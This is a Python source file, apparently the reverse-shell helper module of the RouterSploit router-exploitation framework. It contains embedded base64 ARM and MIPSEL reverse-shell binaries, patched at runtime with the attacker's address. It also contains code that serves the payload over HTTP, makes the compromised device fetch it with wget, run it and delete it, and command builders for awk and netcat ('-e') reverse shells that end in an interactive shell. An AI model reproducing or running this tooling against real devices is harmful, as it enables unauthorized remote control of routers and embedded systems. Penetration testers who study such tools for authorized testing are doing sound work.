import socket
import struct
import os
import telnetlib
import SimpleHTTPServer, BaseHTTPServer
import time
import threading
from base64 import b64decode

from routersploit.utils import (
    print_info,
    print_error,
    print_success,
    print_status,
    random_text,
)


def shell(exploit, architecture="", method="", **params):
    while 1:
        cmd = raw_input("cmd > ")

        if cmd in ["quit", "exit"]:
            return

        c = cmd.split()
        if c[0] == "reverse_tcp":
            if len(c) == 3:
                lhost = c[1]
                lport = c[2]

                revshell = reverse_shell(exploit, architecture, lhost, lport)

                if method == "wget":
                    revshell.wget(binary=params['binary'], location=params['location'])
                elif method == "awk":
                    revshell.awk(binary=params['binary'])
                elif method == "netcat":
                    revshell.netcat(binary=params['binary'], shell=params['shell'])
                else:
                    print_error("Reverse shell is not available")
            else:
                print_error("reverse_tcp <reverse ip> <port>")
        else:
           print_info(exploit.execute(cmd))


class HttpRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET (self):
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()

        self.wfile.write(self.server.content)
        self.server.stop = True
    def log_message(self, format, *args):
        return

class HttpServer(BaseHTTPServer.HTTPServer):
    def serve_forever(self, content):
        self.stop = False
        self.content = content
        while not self.stop:
            self.handle_request()

class reverse_shell(object):
    arm = b64decode("f0VMRgEBAQAAAAAAAAAAAAIAKAABAAAAdIAAADQAAAB0AQAAAgIABTQAIAACACgABwAEAAEAAAAAAAAAAIAAAACAAAAYAQAAGAEAAAUAAAAAgAAAAQAAABgBAAAYAQEAGAEBABAAAAAQAAAABgAAAACAAACEcJ/lAgCg4wEQoOMAIKDjAAAA7wBgoOFwUJ/lBFAt5WxQn+UEUC3lDRCg4RAgoONgcJ/lAAAA7wYAoOEDEKDjARBR4j9woOMAAADv+///GkQAn+UAEKDhAiAi4AQgLeU4EJ/lBBAt5Q0QoOELcKDjAAAA7wAAoOMBcKDjAAAA7wFwoOMAAKDjAAAA7xkBAAB/AQEBAgAFORsBAAAYAQEAJQEBAC9iaW4vYnVzeWJveABzaABBEwAAAGFlYWJpAAEJAAAABgEIAQAuc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC50ZXh0AC5kYXRhAC5BUk0uYXR0cmlidXRlcwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAABAAAABgAAAHSAAAB0AAAApAAAAAAAAAAAAAAABAAAAAAAAAAhAAAAAQAAAAMAAAAYAQEAGAEAABAAAAAAAAAAAAAAAAEAAAAAAAAAJwAAAAMAAHAAAAAAAAAAACgBAAAUAAAAAAAAAAAAAAABAAAAAAAAABEAAAADAAAAAAAAAAAAAAA8AQAANwAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAAjAIAAEABAAAGAAAADAAAAAQAAAAQAAAACQAAAAMAAAAAAAAAAAAAAMwDAABuAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdIAAAAAAAAADAAEAAAAAABgBAQAAAAAAAwACAAAAAAAAAAAAAAAAAAMAAwABAAAAAAAAAAAAAAAEAPH/DwAAABgBAQAAAAAAAAACABQAAAAlAQEAAAAAAAAAAgAXAAAAdIAAAAAAAAAAAAEAGgAAALSAAAAAAAAAAAABAB8AAAAAgQAAAAAAAAAAAQAAAAAAAAAAAAAAAAAEAPH/HwAAABgBAQAAAAAAAAACACIAAAAoAQEAAAAAABAAAgAtAAAAKAEBAAAAAAAQAAIAOwAAACgBAQAAAAAAEAACAEcAAAB0gAAAAAAAABAAAQBOAAAAKAEBAAAAAAAQAAIAWgAAACgBAQAAAAAAEAACAGIAAAAoAQEAAAAAABAAAgBpAAAAKAEBAAAAAAAQAAIAAHJldmVyc2VfdGNwLm8AYnVzeQBzaAAkYQBsb29wACRkAF9ic3NfZW5kX18AX19ic3Nfc3RhcnRfXwBfX2Jzc19lbmRfXwBfc3RhcnQAX19ic3Nfc3RhcnQAX19lbmRfXwBfZWRhdGEAX2VuZAA=")

    mipsel = b64decode("f0VMRgEBAQAAAAAAAAAAAAIACAABAAAAkABAADQAAACMAQAAABAAUDQAIAACACgABgADAAAAAHB0AAAAdABAAHQAQAAYAAAAGAAAAAQAAAAEAAAAAQAAAAAAAAAAAEAAAABAAGABAABgAQAABQAAAAAAAQD0EQAgAAAAAAAAAAAAAAAAAAAAAFCBQQAAAAAA//8EKKYPAiQMCQkBEREEKKYPAiQMCQkB/f8MJCcggAGmDwIkDAkJAf3/DCQnIIABJyiAAf//BihXEAIkDAkJAf//RDDJDwIkDAkJAckPAiQMCQkBemkFPAIApTT4/6WvAAEFPH8ApTT8/6Wv+P+lI+//DCQnMIABShACJAwJCQFiaQg8Ly8INez/qK9zaAg8bi8INfD/qK///wco9P+nr/z/p6/s/6Qj7P+oI/j/qK/4/6Uj7P+9J///BiirDwIkDAkJAQAAAAAAAAAAAAAAAAAuc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5yZWdpbmZvAC50ZXh0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAAGAABwAgAAAHQAQAB0AAAAGAAAAAAAAAAAAAAABAAAABgAAAAkAAAAAQAAAAYAAACQAEAAkAAAANAAAAAAAAAAAAAAABAAAAAAAAAAEQAAAAMAAAAAAAAAAAAAAGABAAAqAAAAAAAAAAAAAAABAAAAAAAAAAEAAAACAAAAAAAAAAAAAAB8AgAAwAAAAAUAAAADAAAABAAAABAAAAAJAAAAAwAAAAAAAAAAAAAAPAMAAEAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB0AEAAAAAAAAMAAQAAAAAAkABAAAAAAAADAAIAAQAAAGABQQAAAAAAEAACAAgAAABQgUEAAAAAABAA8f8MAAAAAAAAAAAAAAAQAAAAFAAAAJAAQAAAAAAAEAACABsAAACQAEAAAAAAABEAAgAiAAAAYAFBAAAAAAAQAPH/LgAAAGABQQAAAAAAEADx/zUAAABgAUEAAAAAABAA8f86AAAAYAFBAAAAAAAQAPH/AF9mZGF0YQBfZ3AAX19zdGFydABfZnRleHQAX3N0YXJ0AF9fYnNzX3N0YXJ0AF9lZGF0YQBfZW5kAF9mYnNzAA==")

    exploit = None
    arch = None
    lhost = None
    lport = None
    binary_name = None
    revshell = None

    def __init__(self, exploit, arch, lhost, lport):
        self.exploit = exploit
        self.arch = arch
        self.lhost = lhost
        self.lport = lport

    def convert_ip(self, addr):
        res = ""
        for i in addr.split("."):
            res += chr(int(i))
        return res

    def convert_port(self, p):
        res = "%.4x" % int(p)
        return res.decode('hex')

    def generate_binary(self, lhost, lport):
        print_status("Generating reverse shell binary")
        self.binary_name = random_text(32)
        ip = self.convert_ip(lhost)
        port = self.convert_port(lport)

        if self.arch == 'arm':
            self.revshell = self.arm[:0x104] + ip + self.arm[0x108:0x10a] + port + self.arm[0x10c:]
        elif self.arch == 'mipsel':
            self.revshell = self.mipsel[:0xe4] + port + self.mipsel[0xe6:0xf0] + ip[2:] + self.mipsel[0xf2:0xf4] + ip[:2] + self.mipsel[0xf6:]
        else:
            print_error("Platform not supported")

    def http_server(self, lhost, lport):
        print_status("Setting up HTTP server")
        server = HttpServer((lhost, int(lport)), HttpRequestHandler)

        server.serve_forever(self.revshell)
        server.server_close()

    def wget(self, binary, location):
        # generate binary
        self.generate_binary(self.lhost, self.lport)

        # run http server
        thread = threading.Thread(target = self.http_server, args=(self.lhost, self.lport))
        thread.start()

        # wget binary
        print_status("Using wget to download binary")
        cmd = "{} http://{}:{}/{} -O {}/{}".format(binary,
                                                   self.lhost,
                                                   self.lport,
                                                   self.binary_name,
                                                   location,
                                                   self.binary_name)

        self.exploit.execute(cmd)

        # execute binary
        sock = self.listen(self.lhost, self.lport)
        self.execute_binary(location, self.binary_name)

        # waiting for shell
        self.shell(sock)

    def awk(self, binary):
        # run reverse shell through awk
        sock = self.listen(self.lhost, self.lport)
        cmd = "{} 'BEGIN{s=\"/inet/tcp/0/{}/{}\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)};'".format(binary, self.lhost, self.lport)
        self.exploit.execute(cmd)

        # waiting for shell
        self.shell(sock)

    def netcat(self, binary, shell):
        # run reverse shell through netcat
        sock = self.listen(self.lhost, self.lport)
        cmd = "{} {} {} -e {}".format(binary,
                                      self.lhost,
                                      self.lport,
                                      shell)

        self.exploit.execute(cmd)

        # waiting for shell
        self.shell(sock)

    def execute_binary(self, location, binary_name):
        path = "{}/{}".format(location, binary_name)
        cmd = "chmod +x {}; {} & rm {}".format(path,
                                               path,
                                               path)

        thread = threading.Thread(target = self.exploit.execute, args=(cmd,))
        thread.start()

    def listen(self, lhost, lport):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((lhost, int(lport)))
        sock.listen(5)
        return sock

    def shell(self, sock):
        print_status("Waiting for reverse shell...")
        client, addr = sock.accept()
        sock.close()
        print_status("Connection from {}:{}".format(addr[0], addr[1]))

        print_success("Enjoy your shell")
        t = telnetlib.Telnet()
        t.sock = client
        t.interact()
